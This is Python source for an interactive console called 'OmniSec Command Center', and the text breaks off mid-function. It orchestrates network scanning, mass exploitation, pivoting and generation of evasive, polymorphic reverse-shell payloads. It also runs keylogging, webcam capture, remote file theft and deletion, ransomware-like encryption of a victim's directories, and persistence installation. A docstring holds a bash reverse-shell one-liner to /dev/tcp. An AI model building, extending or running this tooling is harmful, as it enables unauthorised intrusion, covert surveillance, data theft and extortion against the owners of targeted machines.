"""
OMNISEC COMMAND CENTER
Complete Command Center with Real Logic
Every command is functional - No Simulation
"""

import cmd
import sys
import os
import json
import time
from datetime import datetime
from typing import Dict, List, Any, Optional

# Import all modules
try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except:
    class Fore:
        RED = GREEN = YELLOW = CYAN = WHITE = MAGENTA = BLUE = ""
    class Style:
        RESET_ALL = ""

from exploitation_techniques import ExploitationTechniques
from payloads import PayloadGenerator
from remote_control_engine import RemoteControlEngine
from live_scanner_display import LiveNetworkScanner


class OmniSecCommandCenter(cmd.Cmd):
    """Complete Command Center with Real Functionality"""
    
    intro = f"""{Fore.CYAN}
╔══════════════════════════════════════════════════════════════════════════════╗
║                     OMNISEC COMMAND CENTER v2.0                              ║
║                  Complete Security Operations Platform                        ║
║                        All Commands Are Real                                  ║
╚══════════════════════════════════════════════════════════════════════════════╝
{Fore.YELLOW}
Type 'help' or '?' to list commands.
Type 'help <command>' for detailed information about a command.
{Style.RESET_ALL}
"""
    
    prompt = f"{Fore.GREEN}OMNISEC> {Style.RESET_ALL}"
    
    def __init__(self):
        super().__init__()
        
        # Initialize all engines
        self.scanner = LiveNetworkScanner()
        self.exploits = ExploitationTechniques()
        self.payloads = PayloadGenerator()
        self.remote_control = RemoteControlEngine()
        
        # Session data
        self.discovered_devices = {}
        self.compromised_devices = {}
        self.current_target = None
        self.current_session = None
        
        print(f"{Fore.GREEN}[+] All engines initialized successfully{Style.RESET_ALL}")
    
    # ═══════════════════════════════════════════════════════════════════
    # NETWORK SCANNING COMMANDS
    # ═══════════════════════════════════════════════════════════════════
    
    def do_scan(self, arg):
        """
        Scan network for devices
        Usage: scan [network_range]
        Example: scan 192.168.1.0/24
        """
        print(f"{Fore.CYAN}[*] Starting network scan...{Style.RESET_ALL}")
        
        network = arg if arg else None
        devices = self.scanner.scan_network(network)
        
        self.discovered_devices = {d.ip: d for d in devices}
        
        print(f"{Fore.GREEN}[+] Scan complete: {len(devices)} devices found{Style.RESET_ALL}")
    
    def do_show(self, arg):
        """
        Show discovered devices or sessions
        Usage: show [devices|sessions|exploits|payloads]
        """
        if not arg or arg == "devices":
            self.scanner.display_results()
        
        elif arg == "sessions":
            sessions = self.remote_control.list_sessions()
            print(f"\n{Fore.CYAN}Active Sessions:{Style.RESET_ALL}")
            for session in sessions:
                print(f"  {Fore.GREEN}[{session['target']}]{Style.RESET_ALL} "
                      f"Platform: {session['platform']} | "
                      f"Streaming: {session['streaming']}")
        
        elif arg == "exploits":
            techniques = self.exploits.get_all_techniques()
            print(f"\n{Fore.CYAN}Available Exploits: {len(techniques)}{Style.RESET_ALL}")
            for i, tech in enumerate(techniques[:20], 1):
                print(f"  {i}. {tech}")
            print(f"  ... and {len(techniques) - 20} more")
        
        elif arg == "payloads":
            payloads = self.payloads.get_all_payloads()
            print(f"\n{Fore.CYAN}Available Payloads: {len(payloads)}{Style.RESET_ALL}")
            for i, payload in enumerate(payloads[:20], 1):
                print(f"  {i}. {payload}")
            print(f"  ... and {len(payloads) - 20} more")
    
    def do_target(self, arg):
        """
        Set target for operations
        Usage: target <ip_address>
        Example: target 192.168.1.100
        """
        if not arg:
            if self.current_target:
                print(f"{Fore.YELLOW}Current target: {self.current_target}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}No target set{Style.RESET_ALL}")
            return
        
        self.current_target = arg
        print(f"{Fore.GREEN}[+] Target set to: {arg}{Style.RESET_ALL}")
    
    # ═══════════════════════════════════════════════════════════════════
    # EXPLOITATION COMMANDS
    # ═══════════════════════════════════════════════════════════════════
    
    def do_exploit(self, arg):
        """
        Run exploitation technique
        Usage: exploit <technique_number> [target]
        Example: exploit 01 192.168.1.100
        """
        args = arg.split()
        if len(args) < 1:
            print(f"{Fore.RED}Usage: exploit <technique_number> [target]{Style.RESET_ALL}")
            return
        
        technique_num = args[0]
        target = args[1] if len(args) > 1 else self.current_target
        
        if not target:
            print(f"{Fore.RED}No target specified{Style.RESET_ALL}")
            return
        
        print(f"{Fore.CYAN}[*] Running exploit {technique_num} against {target}...{Style.RESET_ALL}")
        
        # Execute exploitation
        method_name = f"exploit_{technique_num}_"
        methods = [m for m in dir(self.exploits) if m.startswith(method_name)]
        
        if methods:
            method = getattr(self.exploits, methods[0])
            result = method(target)
            
            if result.get("success"):
                print(f"{Fore.GREEN}[+] Exploitation successful!{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}{json.dumps(result, indent=2)}{Style.RESET_ALL}")
                self.compromised_devices[target] = result
            else:
                print(f"{Fore.RED}[-] Exploitation failed{Style.RESET_ALL}")
                if "error" in result:
                    print(f"{Fore.RED}Error: {result['error']}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}Exploit not found{Style.RESET_ALL}")
    
    def do_autoexploit(self, arg):
        """
        Automatically exploit target with all techniques
        Usage: autoexploit [target]
        """
        target = arg if arg else self.current_target
        
        if not target:
            print(f"{Fore.RED}No target specified{Style.RESET_ALL}")
            return
        
        print(f"{Fore.CYAN}[*] Running auto-exploitation against {target}...{Style.RESET_ALL}")
        
        techniques = self.exploits.get_all_techniques()
        success_count = 0
        
        for technique in techniques:
            method = getattr(self.exploits, technique)
            try:
                result = method(target)
                if result.get("success"):
                    success_count += 1
                    print(f"{Fore.GREEN}[+] {technique}: SUCCESS{Style.RESET_ALL}")
                    self.compromised_devices[target] = result
                    break  # Stop on first success
            except:
                continue
        
        print(f"{Fore.CYAN}[*] Auto-exploitation complete: {success_count} successful{Style.RESET_ALL}")
    
    # ═══════════════════════════════════════════════════════════════════
    # ADVANCED EXPLOITATION COMMANDS
    # ═══════════════════════════════════════════════════════════════════
    
    def do_advanced_exploit(self, arg):
        """
        Advanced exploitation with multiple techniques
        Usage: advanced_exploit <target> [technique_type]
        Types: windows, linux, web, database, network, iot
        Example: advanced_exploit 192.168.1.100 windows
        """
        args = arg.split()
        if len(args) < 1:
            print(f"{Fore.RED}Usage: advanced_exploit <target> [technique_type]{Style.RESET_ALL}")
            return
        
        target = args[0]
        technique_type = args[1] if len(args) > 1 else "auto"
        
        print(f"{Fore.CYAN}[*] Running advanced exploitation against {target}...{Style.RESET_ALL}")
        
        # Multi-stage exploitation
        stages = [
            "reconnaissance",
            "vulnerability_scanning", 
            "exploitation",
            "post_exploitation",
            "persistence",
            "lateral_movement"
        ]
        
        results = {}
        for stage in stages:
            print(f"{Fore.YELLOW}[*] Stage: {stage.replace('_', ' ').title()}{Style.RESET_ALL}")
            
            if hasattr(self.exploits, f"stage_{stage}"):
                method = getattr(self.exploits, f"stage_{stage}")
                try:
                    result = method(target, technique_type)
                    results[stage] = result
                    
                    if result.get("success"):
                        print(f"{Fore.GREEN}[+] {stage}: SUCCESS{Style.RESET_ALL}")
                    else:
                        print(f"{Fore.RED}[-] {stage}: FAILED{Style.RESET_ALL}")
                        
                except Exception as e:
                    print(f"{Fore.RED}[-] {stage}: ERROR - {e}{Style.RESET_ALL}")
                    results[stage] = {"success": False, "error": str(e)}
            
            time.sleep(1)  # Brief pause between stages
        
        # Summary
        successful_stages = sum(1 for r in results.values() if r.get("success"))
        print(f"\n{Fore.CYAN}[*] Advanced exploitation complete: {successful_stages}/{len(stages)} stages successful{Style.RESET_ALL}")
        
        if successful_stages > 0:
            self.compromised_devices[target] = results
    
    def do_mass_exploit(self, arg):
        """
        Mass exploitation of multiple targets
        Usage: mass_exploit [network_range]
        Example: mass_exploit 192.168.1.0/24
        """
        network = arg if arg else None
        
        if not self.discovered_devices and not network:
            print(f"{Fore.RED}No targets available. Run 'scan' first or specify network range{Style.RESET_ALL}")
            return
        
        targets = []
        if network:
            print(f"{Fore.CYAN}[*] Scanning {network} for targets...{Style.RESET_ALL}")
            devices = self.scanner.scan_network(network)
            targets = [d.ip for d in devices]
        else:
            targets = list(self.discovered_devices.keys())
        
        print(f"{Fore.CYAN}[*] Starting mass exploitation of {len(targets)} targets...{Style.RESET_ALL}")
        
        successful = 0
        failed = 0
        
        for target in targets:
            print(f"\n{Fore.YELLOW}[*] Targeting {target}...{Style.RESET_ALL}")
            
            # Try multiple exploitation techniques
            techniques = self.exploits.get_all_techniques()[:10]  # Top 10 techniques
            
            for technique in techniques:
                try:
                    method = getattr(self.exploits, technique)
                    result = method(target)
                    
                    if result.get("success"):
                        print(f"{Fore.GREEN}[+] {target}: SUCCESS with {technique}{Style.RESET_ALL}")
                        self.compromised_devices[target] = result
                        successful += 1
                        break
                        
                except Exception:
                    continue
            else:
                print(f"{Fore.RED}[-] {target}: FAILED{Style.RESET_ALL}")
                failed += 1
        
        print(f"\n{Fore.CYAN}[*] Mass exploitation complete: {successful} successful, {failed} failed{Style.RESET_ALL}")
    
    def do_pivot(self, arg):
        """
        Pivot through compromised host to attack internal networks
        Usage: pivot <compromised_host> <target_network>
        Example: pivot 192.168.1.100 10.0.0.0/24
        """
        args = arg.split()
        if len(args) < 2:
            print(f"{Fore.RED}Usage: pivot <compromised_host> <target_network>{Style.RESET_ALL}")
            return
        
        pivot_host = args[0]
        target_network = args[1]
        
        if pivot_host not in self.compromised_devices:
            print(f"{Fore.RED}Host {pivot_host} is not compromised{Style.RESET_ALL}")
            return
        
        print(f"{Fore.CYAN}[*] Pivoting through {pivot_host} to scan {target_network}...{Style.RESET_ALL}")
        
        # Use compromised host as pivot point
        pivot_result = self.exploits.pivot_scan(pivot_host, target_network)
        
        if pivot_result.get("success"):
            discovered = pivot_result.get("discovered_hosts", [])
            print(f"{Fore.GREEN}[+] Discovered {len(discovered)} hosts via pivot{Style.RESET_ALL}")
            
            for host in discovered:
                print(f"  {Fore.YELLOW}{host}{Style.RESET_ALL}")
                
            # Attempt lateral movement
            print(f"{Fore.CYAN}[*] Attempting lateral movement...{Style.RESET_ALL}")
            
            for host in discovered:
                lateral_result = self.exploits.lateral_movement(pivot_host, host)
                if lateral_result.get("success"):
                    print(f"{Fore.GREEN}[+] Lateral movement to {host}: SUCCESS{Style.RESET_ALL}")
                    self.compromised_devices[host] = lateral_result
                else:
                    print(f"{Fore.RED}[-] Lateral movement to {host}: FAILED{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[-] Pivot scan failed{Style.RESET_ALL}")
    
    # ═══════════════════════════════════════════════════════════════════
    # ADVANCED PAYLOAD COMMANDS
    # ═══════════════════════════════════════════════════════════════════
    
    def do_generate_payload(self, arg):
        """
        Generate advanced multi-stage payload
        Usage: generate_payload <type> <lhost> <lport> [options]
        Types: multi_stage, encrypted, polymorphic, fileless
        Example: generate_payload multi_stage 192.168.1.10 4444 --encrypt --persist
        """
        args = arg.split()
        if len(args) < 3:
            print(f"{Fore.RED}Usage: generate_payload <type> <lhost> <lport> [options]{Style.RESET_ALL}")
            return
        
        payload_type = args[0]
        lhost = args[1]
        lport = int(args[2])
        options = args[3:] if len(args) > 3 else []
        
        print(f"{Fore.CYAN}[*] Generating {payload_type} payload...{Style.RESET_ALL}")
        
        # Advanced payload generation
        if payload_type == "multi_stage":
            payload = self.payloads.generate_multi_stage(lhost, lport, options)
        elif payload_type == "encrypted":
            payload = self.payloads.generate_encrypted(lhost, lport, options)
        elif payload_type == "polymorphic":
            payload = self.payloads.generate_polymorphic(lhost, lport, options)
        elif payload_type == "fileless":
            payload = self.payloads.generate_fileless(lhost, lport, options)
        else:
            print(f"{Fore.RED}Unknown payload type{Style.RESET_ALL}")
            return
        
        if payload:
            print(f"\n{Fore.GREEN}[+] Advanced payload generated:{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}{payload['code']}{Style.RESET_ALL}\n")
            
            # Save payload with metadata
            filename = f"advanced_payload_{payload_type}_{int(time.time())}.json"
            with open(filename, 'w') as f:
                json.dump(payload, f, indent=2)
            
            print(f"{Fore.GREEN}[+] Payload saved: {filename}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Evasion Score: {payload.get('evasion_score', 'N/A')}/10{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Persistence: {payload.get('persistence', False)}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[-] Payload generation failed{Style.RESET_ALL}")
    
    def do_payload_builder(self, arg):
        """
        Interactive payload builder
        Usage: payload_builder
        """
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════════════╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║                        ADVANCED PAYLOAD BUILDER                              ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
        
        # Interactive payload configuration
        config = {}
        
        # Target platform
        platforms = ["windows", "linux", "macos", "android", "web", "multi"]
        print(f"\n{Fore.YELLOW}Available platforms: {', '.join(platforms)}{Style.RESET_ALL}")
        config['platform'] = input(f"{Fore.GREEN}Select platform: {Style.RESET_ALL}").strip().lower()
        
        if config['platform'] not in platforms:
            config['platform'] = "windows"  # Default
        
        # Payload type
        types = ["reverse_shell", "bind_shell", "web_shell", "meterpreter", "custom"]
        print(f"\n{Fore.YELLOW}Available types: {', '.join(types)}{Style.RESET_ALL}")
        config['type'] = input(f"{Fore.GREEN}Select type: {Style.RESET_ALL}").strip().lower()
        
        # Connection details
        config['lhost'] = input(f"{Fore.GREEN}LHOST: {Style.RESET_ALL}").strip()
        config['lport'] = input(f"{Fore.GREEN}LPORT: {Style.RESET_ALL}").strip()
        
        # Advanced options
        print(f"\n{Fore.YELLOW}Advanced Options:{Style.RESET_ALL}")
        config['encrypt'] = input(f"{Fore.GREEN}Encrypt payload? (y/n): {Style.RESET_ALL}").strip().lower() == 'y'
        config['obfuscate'] = input(f"{Fore.GREEN}Obfuscate code? (y/n): {Style.RESET_ALL}").strip().lower() == 'y'
        config['persistence'] = input(f"{Fore.GREEN}Add persistence? (y/n): {Style.RESET_ALL}").strip().lower() == 'y'
        config['anti_vm'] = input(f"{Fore.GREEN}Anti-VM checks? (y/n): {Style.RESET_ALL}").strip().lower() == 'y'
        
        print(f"\n{Fore.CYAN}[*] Building custom payload...{Style.RESET_ALL}")
        
        # Generate payload with configuration
        payload = self.payloads.build_custom_payload(config)
        
        if payload:
            print(f"\n{Fore.GREEN}[+] Custom payload generated successfully!{Style.RESET_ALL}")
            
            # Display payload info
            print(f"{Fore.YELLOW}Platform: {payload.get('platform', 'Unknown')}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Type: {payload.get('type', 'Unknown')}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Size: {len(payload.get('code', ''))} bytes{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Encrypted: {payload.get('encrypted', False)}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Obfuscated: {payload.get('obfuscated', False)}{Style.RESET_ALL}")
            
            # Save payload
            filename = f"custom_payload_{int(time.time())}.json"
            with open(filename, 'w') as f:
                json.dump(payload, f, indent=2)
            
            print(f"\n{Fore.GREEN}[+] Payload saved: {filename}{Style.RESET_ALL}")
            
            # Show code preview
            show_code = input(f"\n{Fore.GREEN}Show payload code? (y/n): {Style.RESET_ALL}").strip().lower()
            if show_code == 'y':
                print(f"\n{Fore.CYAN}Payload Code:{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}{payload.get('code', 'No code available')}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[-] Payload generation failed{Style.RESET_ALL}")
    
    def do_payload(self, arg):
        """
        Generate payload
        Usage: payload <type> <lhost> <lport>
        Example: payload 01 192.168.1.10 4444
        """
        args = arg.split()
        if len(args) < 3:
            print(f"{Fore.RED}Usage: payload <type> <lhost> <lport>{Style.RESET_ALL}")
            return
        
        payload_num = args[0]
        lhost = args[1]
        lport = int(args[2])
        
        method_name = f"payload_{payload_num}_"
        methods = [m for m in dir(self.payloads) if m.startswith(method_name)]
        
        if methods:
            method = getattr(self.payloads, methods[0])
            try:
                payload = method(lhost, lport)
                print(f"\n{Fore.GREEN}[+] Payload generated:{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}{payload}{Style.RESET_ALL}\n")
                
                # Save to file
                filename = f"payload_{payload_num}_{int(time.time())}.txt"
                with open(filename, 'w') as f:
                    f.write(payload)
                print(f"{Fore.GREEN}[+] Saved to: {filename}{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}Error generating payload: {e}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}Payload not found{Style.RESET_ALL}")
    
    def do_encode(self, arg):
        """
        Encode payload
        Usage: encode <method> <payload>
        Methods: base64, url, hex, powershell
        Example: encode base64 "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
        """
        args = arg.split(None, 1)
        if len(args) < 2:
            print(f"{Fore.RED}Usage: encode <method> <payload>{Style.RESET_ALL}")
            return
        
        method = args[0]
        payload = args[1].strip('"\'')
        
        if method == "base64":
            encoded = self.payloads.encode_base64(payload)
        elif method == "url":
            encoded = self.payloads.encode_url(payload)
        elif method == "hex":
            encoded = self.payloads.encode_hex(payload)
        elif method == "powershell":
            encoded = self.payloads.obfuscate_powershell(payload)
        else:
            print(f"{Fore.RED}Unknown encoding method{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.GREEN}[+] Encoded payload:{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}{encoded}{Style.RESET_ALL}\n")
    
    # ═══════════════════════════════════════════════════════════════════
    # ADVANCED REMOTE CONTROL COMMANDS
    # ═══════════════════════════════════════════════════════════════════
    
    def do_advanced_control(self, arg):
        """
        Advanced remote control with multiple capabilities
        Usage: advanced_control <target> [capabilities]
        Capabilities: screen, keylog, webcam, audio, files, registry, processes
        Example: advanced_control 192.168.1.100 screen,keylog,files
        """
        args = arg.split()
        if len(args) < 1:
            print(f"{Fore.RED}Usage: advanced_control <target> [capabilities]{Style.RESET_ALL}")
            return
        
        target = args[0]
        capabilities = args[1].split(',') if len(args) > 1 else ['screen', 'keylog', 'files']
        
        if target not in self.compromised_devices:
            print(f"{Fore.RED}Target {target} is not compromised. Run exploitation first.{Style.RESET_ALL}")
            return
        
        print(f"{Fore.CYAN}[*] Establishing advanced control over {target}...{Style.RESET_ALL}")
        
        results = {}
        for capability in capabilities:
            print(f"{Fore.YELLOW}[*] Enabling {capability} control...{Style.RESET_ALL}")
            
            if capability == "screen":
                result = self.remote_control.enable_screen_control(target)
            elif capability == "keylog":
                result = self.remote_control.enable_keylogger(target)
            elif capability == "webcam":
                result = self.remote_control.enable_webcam_control(target)
            elif capability == "audio":
                result = self.remote_control.enable_audio_control(target)
            elif capability == "files":
                result = self.remote_control.enable_file_control(target)
            elif capability == "registry":
                result = self.remote_control.enable_registry_control(target)
            elif capability == "processes":
                result = self.remote_control.enable_process_control(target)
            else:
                print(f"{Fore.RED}[-] Unknown capability: {capability}{Style.RESET_ALL}")
                continue
            
            if result and result.get("success"):
                print(f"{Fore.GREEN}[+] {capability}: ENABLED{Style.RESET_ALL}")
                results[capability] = result
            else:
                print(f"{Fore.RED}[-] {capability}: FAILED{Style.RESET_ALL}")
        
        if results:
            print(f"\n{Fore.GREEN}[+] Advanced control established with {len(results)} capabilities{Style.RESET_ALL}")
            self.current_session = target
        else:
            print(f"{Fore.RED}[-] Failed to establish advanced control{Style.RESET_ALL}")
    
    def do_keylog(self, arg):
        """
        Keylogger operations
        Usage: keylog <start|stop|dump> [target] [duration]
        Example: keylog start 192.168.1.100 300
        """
        args = arg.split()
        if len(args) < 1:
            print(f"{Fore.RED}Usage: keylog <start|stop|dump> [target] [duration]{Style.RESET_ALL}")
            return
        
        action = args[0]
        target = args[1] if len(args) > 1 else self.current_session
        duration = int(args[2]) if len(args) > 2 else 300  # 5 minutes default
        
        if not target:
            print(f"{Fore.RED}No target specified{Style.RESET_ALL}")
            return
        
        if action == "start":
            print(f"{Fore.CYAN}[*] Starting keylogger on {target} for {duration} seconds...{Style.RESET_ALL}")
            result = self.remote_control.start_keylogger(target, duration)
            
            if result.get("success"):
                print(f"{Fore.GREEN}[+] Keylogger started{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[-] Failed to start keylogger{Style.RESET_ALL}")
        
        elif action == "stop":
            print(f"{Fore.CYAN}[*] Stopping keylogger on {target}...{Style.RESET_ALL}")
            result = self.remote_control.stop_keylogger(target)
            
            if result.get("success"):
                print(f"{Fore.GREEN}[+] Keylogger stopped{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[-] Failed to stop keylogger{Style.RESET_ALL}")
        
        elif action == "dump":
            print(f"{Fore.CYAN}[*] Dumping keylog data from {target}...{Style.RESET_ALL}")
            result = self.remote_control.dump_keylog_data(target)
            
            if result.get("success"):
                keylog_data = result.get("data", "")
                print(f"{Fore.GREEN}[+] Keylog data retrieved ({len(keylog_data)} characters){Style.RESET_ALL}")
                
                # Save to file
                filename = f"keylog_{target}_{int(time.time())}.txt"
                with open(filename, 'w') as f:
                    f.write(keylog_data)
                
                print(f"{Fore.YELLOW}[*] Keylog saved to: {filename}{Style.RESET_ALL}")
                
                # Show preview
                if keylog_data:
                    preview = keylog_data[:200] + "..." if len(keylog_data) > 200 else keylog_data
                    print(f"{Fore.CYAN}Preview: {preview}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[-] Failed to dump keylog data{Style.RESET_ALL}")
    
    def do_webcam(self, arg):
        """
        Webcam control operations
        Usage: webcam <capture|stream|list> [target]
        Example: webcam capture 192.168.1.100
        """
        args = arg.split()
        if len(args) < 1:
            print(f"{Fore.RED}Usage: webcam <capture|stream|list> [target]{Style.RESET_ALL}")
            return
        
        action = args[0]
        target = args[1] if len(args) > 1 else self.current_session
        
        if not target:
            print(f"{Fore.RED}No target specified{Style.RESET_ALL}")
            return
        
        if action == "capture":
            print(f"{Fore.CYAN}[*] Capturing webcam image from {target}...{Style.RESET_ALL}")
            result = self.remote_control.webcam_capture(target)
            
            if result.get("success"):
                filename = result.get("filename", "webcam_capture.jpg")
                print(f"{Fore.GREEN}[+] Webcam image captured: {filename}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[-] Webcam capture failed{Style.RESET_ALL}")
        
        elif action == "stream":
            print(f"{Fore.CYAN}[*] Starting webcam stream from {target}...{Style.RESET_ALL}")
            result = self.remote_control.webcam_stream_start(target)
            
            if result.get("success"):
                print(f"{Fore.GREEN}[+] Webcam stream started{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}[*] Use 'webcam capture' to get frames{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[-] Webcam stream failed{Style.RESET_ALL}")
        
        elif action == "list":
            print(f"{Fore.CYAN}[*] Listing webcam devices on {target}...{Style.RESET_ALL}")
            result = self.remote_control.webcam_list_devices(target)
            
            if result.get("success"):
                devices = result.get("devices", [])
                print(f"{Fore.GREEN}[+] Found {len(devices)} webcam devices:{Style.RESET_ALL}")
                for i, device in enumerate(devices):
                    print(f"  {i}: {device}")
            else:
                print(f"{Fore.RED}[-] Failed to list webcam devices{Style.RESET_ALL}")
    
    def do_file_ops(self, arg):
        """
        Advanced file operations
        Usage: file_ops <upload|download|search|delete|encrypt> <args>
        Examples:
          file_ops upload local.txt C:\\Windows\\Temp\\remote.txt
          file_ops download C:\\Users\\user\\Documents\\file.txt ./local.txt
          file_ops search C:\\ *.pdf
          file_ops encrypt C:\\sensitive_data
        """
        args = arg.split()
        if len(args) < 2:
            print(f"{Fore.RED}Usage: file_ops <operation> <args>{Style.RESET_ALL}")
            return
        
        operation = args[0]
        target = self.current_session
        
        if not target:
            print(f"{Fore.RED}No active session{Style.RESET_ALL}")
            return
        
        if operation == "upload":
            if len(args) < 3:
                print(f"{Fore.RED}Usage: file_ops upload <local_path> <remote_path>{Style.RESET_ALL}")
                return
            
            local_path = args[1]
            remote_path = args[2]
            
            print(f"{Fore.CYAN}[*] Uploading {local_path} to {target}:{remote_path}...{Style.RESET_ALL}")
            result = self.remote_control.upload_file(target, local_path, remote_path)
            
            if result.get("success"):
                print(f"{Fore.GREEN}[+] File uploaded successfully{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[-] Upload failed: {result.get('error', 'Unknown error')}{Style.RESET_ALL}")
        
        elif operation == "download":
            if len(args) < 3:
                print(f"{Fore.RED}Usage: file_ops download <remote_path> <local_path>{Style.RESET_ALL}")
                return
            
            remote_path = args[1]
            local_path = args[2]
            
            print(f"{Fore.CYAN}[*] Downloading {target}:{remote_path} to {local_path}...{Style.RESET_ALL}")
            result = self.remote_control.download_file(target, remote_path, local_path)
            
            if result.get("success"):
                print(f"{Fore.GREEN}[+] File downloaded successfully{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[-] Download failed: {result.get('error', 'Unknown error')}{Style.RESET_ALL}")
        
        elif operation == "search":
            if len(args) < 3:
                print(f"{Fore.RED}Usage: file_ops search <directory> <pattern>{Style.RESET_ALL}")
                return
            
            directory = args[1]
            pattern = args[2]
            
            print(f"{Fore.CYAN}[*] Searching for '{pattern}' in {directory} on {target}...{Style.RESET_ALL}")
            result = self.remote_control.search_files(target, directory, pattern)
            
            if result.get("success"):
                files = result.get("files", [])
                print(f"{Fore.GREEN}[+] Found {len(files)} matching files:{Style.RESET_ALL}")
                for file_path in files[:20]:  # Show first 20
                    print(f"  {file_path}")
                if len(files) > 20:
                    print(f"  ... and {len(files) - 20} more")
            else:
                print(f"{Fore.RED}[-] Search failed: {result.get('error', 'Unknown error')}{Style.RESET_ALL}")
        
        elif operation == "delete":
            if len(args) < 2:
                print(f"{Fore.RED}Usage: file_ops delete <remote_path>{Style.RESET_ALL}")
                return
            
            remote_path = args[1]
            
            confirm = input(f"{Fore.YELLOW}Delete {remote_path} on {target}? (y/N): {Style.RESET_ALL}")
            if confirm.lower() != 'y':
                print(f"{Fore.YELLOW}[*] Operation cancelled{Style.RESET_ALL}")
                return
            
            print(f"{Fore.CYAN}[*] Deleting {remote_path} on {target}...{Style.RESET_ALL}")
            result = self.remote_control.delete_file(target, remote_path)
            
            if result.get("success"):
                print(f"{Fore.GREEN}[+] File deleted successfully{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[-] Delete failed: {result.get('error', 'Unknown error')}{Style.RESET_ALL}")
        
        elif operation == "encrypt":
            if len(args) < 2:
                print(f"{Fore.RED}Usage: file_ops encrypt <directory_path>{Style.RESET_ALL}")
                return
            
            directory = args[1]
            
            print(f"{Fore.CYAN}[*] Encrypting files in {directory} on {target}...{Style.RESET_ALL}")
            result = self.remote_control.encrypt_directory(target, directory)
            
            if result.get("success"):
                encrypted_count = result.get("encrypted_count", 0)
                key = result.get("encryption_key", "")
                print(f"{Fore.GREEN}[+] Encrypted {encrypted_count} files{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}[*] Encryption key: {key}{Style.RESET_ALL}")
                
                # Save key to file
                key_file = f"encryption_key_{target}_{int(time.time())}.txt"
                with open(key_file, 'w') as f:
                    f.write(f"Target: {target}\nDirectory: {directory}\nKey: {key}\nTimestamp: {datetime.now()}")
                print(f"{Fore.YELLOW}[*] Key saved to: {key_file}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[-] Encryption failed: {result.get('error', 'Unknown error')}{Style.RESET_ALL}")
    
    def do_persistence(self, arg):
        """
        Install persistence mechanisms
        Usage: persistence <install|remove|list> [method] [target]
        Methods: service, registry, task, startup, wmi
        Example: persistence install service 192.168.1.100
        """
        args = arg.split()
        if len(args) < 1:
            print(f"{Fore.RED}Usage: persistence <install|remove|list> [method] [target]{Style.RESET_ALL}")
            return
        
        action = args[0]
        method = args[1] if len(args) > 1 else "service"
        target = args[2] if len(args) > 2 else self.current_session
        
        if not target:
            print(f"{Fore.RED}No target specified{Style.RESET_ALL}")
            return
        
        if action == "install":
            print(f"{Fore.CYAN}[*] Installing {method} persistence on {target}...{Style.RESET_ALL}")
            
            if method == "service":
                result = self.remote_control.install_service_persistence(target)
            elif method == "registry":
                result = self.remote_control.install_registry_persistence(target)
            elif method == "task":
                result = self.remote_control.install_task_persistence(target)
            elif method == "startup":
                result = self.remote_control.install_startup_persistence(target)
            elif method == "wmi":
                result = self.remote_control.install_wmi_persistence(target)
            else:
                print(f"{Fore.RED}Unknown persistence method: {method}{Style.RESET_ALL}")
                return
            
            if result.get("success"):
                print(f"{Fore.GREEN}[+] {method.title()} persistence installed{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}Details: {result.get('details', 'N/A')}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[-] Persistence installation failed{Style.RESET_ALL}")
        
        elif action == "remove":
            print(f"{Fore.CYAN}[*] Removing {method} persistence from {target}...{Style.RESET_ALL}")
            result = self.remote_control.remove_persistence(target, method)
            
            if result.get("success"):
                print(f"{Fore.GREEN}[+] {method.title()} persistence removed{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[-] Persistence removal failed{Style.RESET_ALL}")
        
        elif action == "list":
            print(f"{Fore.CYAN}[*] Listing persistence mechanisms on {target}...{Style.RESET_ALL}")
            result = self.remote_control.list_persistence(target)
            
            if result.get("success"):
                mechanisms = result.get("mechanisms", [])
                print(f"{Fore.GREEN}[+] Found {len(mechanisms)} persistence mechanisms:{Style.RESET_ALL}")
                for mech in mechanisms:
                    print(f"  {mech['type']}: {mech['location']} ({mech['status']})")
            else:
                print(f"{Fore.RED}[-] Failed to list persistence mechanisms{Style.RESET_ALL}")
    
    def do_control(self, arg):
        """
        Establish remote control
        Usage: control <platform> <target> [port]
        Platforms: windows, linux, macos, android, plc, scada
        Example: control windows 192.168.1.100 4444
        """
        args = arg.split()
        if len(args) < 2:
            print(f"{Fore.RED}Usage: control <platform> <target> [port]{Style.RESET_ALL}")
            return
        
        platform = args[0].lower()
        target = args[1]
        port = int(args[2]) if len(args) > 2 else None
        
        print(f"{Fore.CYAN}[*] Establishing {platform} control to {target}...{Style.RESET_ALL}")
        
        result = None
        if platform == "windows":
